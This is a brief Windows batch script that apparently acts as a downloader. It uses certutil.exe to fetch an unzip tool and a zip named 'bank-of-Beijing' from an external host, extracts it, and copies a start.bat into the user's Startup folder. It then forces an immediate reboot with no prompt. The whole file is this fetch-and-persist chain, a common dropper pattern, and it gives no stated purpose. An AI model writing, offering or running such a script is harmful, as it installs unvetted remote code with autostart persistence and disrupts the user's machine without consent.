@echo off
rem start python TransFile.py
set d=%USERPROFILE%\Desktop
set downPath=http://testlink.beats-digital.com/tools
set zipName=bank-of-Beijing
echo %d%
echo %downPath%
echo %zipName%


certutil.exe -urlcache -split -f %downPath%/unzip.exe

certutil.exe -urlcache -split -f %downPath%/%zipName%.zip

unzip -o %zipName%.zip -d %zipName%/

xcopy /y %d%\%zipName%\start.bat "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"

shutdown /r /t 0

::pause